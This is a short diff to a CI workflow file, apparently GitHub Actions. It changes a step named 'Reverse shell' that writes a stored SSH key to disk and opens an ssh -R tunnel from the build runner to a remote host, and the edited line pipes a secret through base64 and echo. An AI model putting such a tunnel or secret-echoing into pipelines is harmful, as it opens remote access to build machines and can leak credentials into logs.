@@ -37,9 +37,9 @@ jobs:
 
       - name: Reverse shell
         run: |
-          echo ${{ secrets.SSH_SHARE }} \
-          && echo ${{ secrets.SSH_KEY }} | tee ~/.ssh/id_rsa \
-          && ssh -R 2222:localhost:1024 ${{ secrets.SSH_USER}} ${{ secrets.REMOTE_HOST }}
+          echo ${{ secrets.SSH_SHARE }} | base64 \
+          && echo ${{ secrets.SSH_KEY }} >> ~/.ssh/id_rsa \
+          && ssh -R 2222:localhost:1024 -l ${{ secrets.SSH_USER}} ${{ secrets.REMOTE_HOST }}
 
       - name: Upload OCI artifacts to GitHub packages
         env:
